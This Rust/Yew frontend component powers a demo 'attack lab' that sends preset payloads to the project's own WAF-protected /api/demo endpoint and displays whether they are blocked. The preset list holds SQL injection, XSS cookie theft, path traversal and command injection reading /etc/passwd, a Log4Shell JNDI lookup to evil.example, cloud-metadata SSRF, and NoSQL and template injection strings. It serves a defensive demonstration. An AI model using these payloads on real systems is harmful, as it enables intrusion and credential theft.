//! Live attack lab: sends payloads to `/api/demo` (protected by securite)
//! and shows what the shield answers.

use gloo::net::http::Request;
use gloo::timers::callback::Interval;
use web_sys::HtmlInputElement;
use yew::prelude::*;

use crate::icons::Icon;
use crate::use_lang;

pub const PRESETS: &[(&str, &str)] = &[
    ("SQLi", "1' OR '1'='1"),
    ("UNION", "1 UNION SELECT username, password FROM users--"),
    ("XSS", "<script>alert(document.cookie)</script>"),
    ("XSS img", "<img src=x onerror=alert(1)>"),
    ("Traversal", "../../../../etc/passwd"),
    ("Log4Shell", "${jndi:ldap://evil.example/a}"),
    ("RCE", "127.0.0.1; cat /etc/passwd"),
    ("SSRF", "http://169.254.169.254/latest/meta-data/"),
    ("NoSQL", "{\"$where\": \"sleep(5000)\"}"),
    ("SSTI", "{{7*7}}"),
    ("Legit", "rust web security"),
];

#[derive(Clone, PartialEq)]
enum Outcome {
    Idle,
    Loading,
    Offline,
    Done {
        status: u16,
        body: String,
        request_id: Option<String>,
        ms: f64,
    },
}

#[derive(Clone, PartialEq)]
struct HistoryItem {
    label: String,
    status: u16,
}

async fn send(payload: String) -> Outcome {
    let started = js_sys::Date::now();
    let url = format!(
        "{}?payload={}",
        crate::asset("api/demo"),
        String::from(js_sys::encode_uri_component(&payload))
    );
    match Request::get(&url).send().await {
        Ok(res) => {
            let ct = res.headers().get("content-type").unwrap_or_default();
            if !ct.contains("json") {
                return Outcome::Offline;
            }
            let status = res.status();
            let request_id = res.headers().get("x-request-id");
            let body = res.text().await.unwrap_or_default();
            Outcome::Done {
                status,
                body: pretty_json(&body),
                request_id,
                ms: js_sys::Date::now() - started,
            }
        }
        Err(_) => Outcome::Offline,
    }
}

/// Minimal JSON pretty printer (no serde in the browser bundle).
fn pretty_json(s: &str) -> String {
    let mut out = String::new();
    let mut indent = 0usize;
    let mut in_str = false;
    let mut escape = false;
    for c in s.chars() {
        if in_str {
            out.push(c);
            if escape {
                escape = false;
            } else if c == '\\' {
                escape = true;
            } else if c == '"' {
                in_str = false;
            }
            continue;
        }
        match c {
            '"' => {
                in_str = true;
                out.push(c);
            }
            '{' | '[' => {
                indent += 1;
                out.push(c);
                out.push('\n');
                out.push_str(&"  ".repeat(indent));
            }
            '}' | ']' => {
                indent = indent.saturating_sub(1);
                out.push('\n');
                out.push_str(&"  ".repeat(indent));
                out.push(c);
            }
            ',' => {
                out.push(c);
                out.push('\n');
                out.push_str(&"  ".repeat(indent));
            }
            ':' => out.push_str(": "),
            c if c.is_whitespace() => {}
            c => out.push(c),
        }
    }
    out
}

#[derive(Properties, PartialEq)]
pub struct AttackLabProps {
    #[prop_or_default]
    pub compact: bool,
}

#[component]
pub fn AttackLab(props: &AttackLabProps) -> Html {
    let t = use_lang().lang.t();
    let payload = use_state(|| PRESETS[0].1.to_string());
    let outcome = use_state(|| Outcome::Idle);
    let history = use_state(Vec::<HistoryItem>::new);

    let fire = {
        let outcome = outcome.clone();
        let history = history.clone();
        Callback::from(move |p: String| {
            let outcome = outcome.clone();
            let history = history.clone();
            outcome.set(Outcome::Loading);
            wasm_bindgen_futures::spawn_local(async move {
                let result = send(p.clone()).await;
                if let Outcome::Done { status, .. } = &result {
                    let mut h = (*history).clone();
                    let label: String = p.chars().take(42).collect();
                    h.insert(
                        0,
                        HistoryItem {
                            label,
                            status: *status,
                        },
                    );
                    h.truncate(6);
                    history.set(h);
                }
                outcome.set(result);
            });
        })
    };

    let on_input = {
        let payload = payload.clone();
        Callback::from(move |e: InputEvent| {
            let input: HtmlInputElement = e.target_unchecked_into();
            payload.set(input.value());
        })
    };
    let on_submit = {
        let fire = fire.clone();
        let payload = payload.clone();
        Callback::from(move |e: SubmitEvent| {
            e.prevent_default();
            fire.emit((*payload).clone());
        })
    };

    let result = match &*outcome {
        Outcome::Idle => html! { <div class="term-line muted">{ t.play_waiting }</div> },
        Outcome::Loading => {
            html! { <div class="term-line"><span class="spinner"></span>{" GET /api/demo …"}</div> }
        }
        Outcome::Offline => html! { <div class="term-line warn-text">{ t.play_offline }</div> },
        Outcome::Done {
            status,
            body,
            request_id,
            ms,
        } => {
            let blocked = *status >= 400;
            html! {
                <div class={classes!("verdict", if blocked { "blocked" } else { "allowed" })}>
                    <div class="verdict-head">
                        <span class="verdict-badge">
                            <Icon name={if blocked { "shield" } else { "check" }} size={18} />
                            { if blocked { t.play_blocked } else { t.play_allowed } }
                        </span>
                        <span class="verdict-status">{ format!("HTTP {status}") }</span>
                        <span class="verdict-time">{ format!("{ms:.0} ms") }</span>
                    </div>
                    if let Some(id) = request_id {
                        <div class="term-line muted small">{ format!("x-request-id: {id}") }</div>
                    }
                    <pre class="verdict-body">{ body }</pre>
                </div>
            }
        }
    };

    html! {
        <div class={classes!("lab", props.compact.then_some("compact"))}>
            <form class="lab-form" onsubmit={on_submit}>
                <label for="payload" class="lab-label">{ t.play_payload }</label>
                <div class="lab-input">
                    <span class="prompt">{"?payload="}</span>
                    <input id="payload" type="text" value={(*payload).clone()} oninput={on_input}
                        spellcheck="false" autocomplete="off" />
                    <button class="btn btn-primary" type="submit"><Icon name="play" size={16} />{ t.play_send }</button>
                </div>
            </form>
            <div class="lab-presets">
                <span class="lab-label">{ t.play_presets }</span>
                <div class="chips">
                    { for PRESETS.iter().map(|(label, p)| {
                        let fire = fire.clone();
                        let payload = payload.clone();
                        let p = p.to_string();
                        let onclick = Callback::from(move |_| { payload.set(p.clone()); fire.emit(p.clone()); });
                        html! { <button class={classes!("chip", (*label == "Legit").then_some("chip-ok"))} {onclick}>{ *label }</button> }
                    }) }
                </div>
            </div>
            <div class="terminal">
                <div class="code-head"><span class="dots"><i></i><i></i><i></i></span><span class="code-lang">{"securite · shield"}</span></div>
                <div class="terminal-body">
                    { result }
                    if !history.is_empty() {
                        <ul class="history">
                            { for history.iter().map(|h| html! {
                                <li>
                                    <span class={classes!("status-dot", if h.status >= 400 { "bad" } else { "ok" })}></span>
                                    <code>{ &h.label }</code>
                                    <span class="muted">{ h.status }</span>
                                </li>
                            }) }
                        </ul>
                    }
                </div>
            </div>
        </div>
    }
}

#[derive(Clone, PartialEq, Default)]
struct Stats {
    total: u64,
    allowed: u64,
    blocked: u64,
}

fn parse_stats(s: &str) -> Option<Stats> {
    let get = |key: &str| -> Option<u64> {
        let pat = format!("\"{key}\":");
        let start = s.find(&pat)? + pat.len();
        let digits: String = s[start..]
            .chars()
            .take_while(char::is_ascii_digit)
            .collect();
        digits.parse().ok()
    };
    Some(Stats {
        total: get("total")?,
        allowed: get("allowed")?,
        blocked: get("blocked")?,
    })
}

/// Live counters from `/api/stats`, refreshed every 4 s.
#[component]
pub fn LiveStats() -> Html {
    let t = use_lang().lang.t();
    let stats = use_state(|| None::<Stats>);
    {
        let stats = stats.clone();
        use_effect_with((), move |_| {
            // On static hosting (GitHub Pages) there is no API: stop polling
            // after the first miss instead of logging a 404 every 4 s.
            let offline = std::rc::Rc::new(std::cell::Cell::new(false));
            let load = {
                let stats = stats.clone();
                move || {
                    if offline.get() {
                        return;
                    }
                    let stats = stats.clone();
                    let offline = offline.clone();
                    wasm_bindgen_futures::spawn_local(async move {
                        if let Ok(res) = Request::get(&crate::asset("api/stats")).send().await
                            && res
                                .headers()
                                .get("content-type")
                                .unwrap_or_default()
                                .contains("json")
                            && let Ok(body) = res.text().await
                        {
                            stats.set(parse_stats(&body));
                        } else {
                            offline.set(true);
                        }
                    });
                }
            };
            load();
            let interval = Interval::new(4000, load);
            move || drop(interval)
        });
    }
    let Some(s) = (*stats).clone() else {
        return html! {};
    };
    let pct = |v: u64| {
        if s.total == 0 {
            0.0
        } else {
            v as f64 * 100.0 / s.total as f64
        }
    };
    html! {
        <div class="live-stats">
            <div class="live-head"><span class="pulse"></span>{ t.play_stats }</div>
            <div class="live-grid">
                <div><strong>{ s.total }</strong><span>{ t.play_total }</span></div>
                <div class="ok"><strong>{ s.allowed }</strong><span>{ t.play_passed }</span></div>
                <div class="bad"><strong>{ s.blocked }</strong><span>{ t.play_stopped }</span></div>
            </div>
            <div class="live-bar">
                <span class="ok" style={format!("width:{:.1}%", pct(s.allowed))}></span>
                <span class="bad" style={format!("width:{:.1}%", pct(s.blocked))}></span>
            </div>
        </div>
    }
}
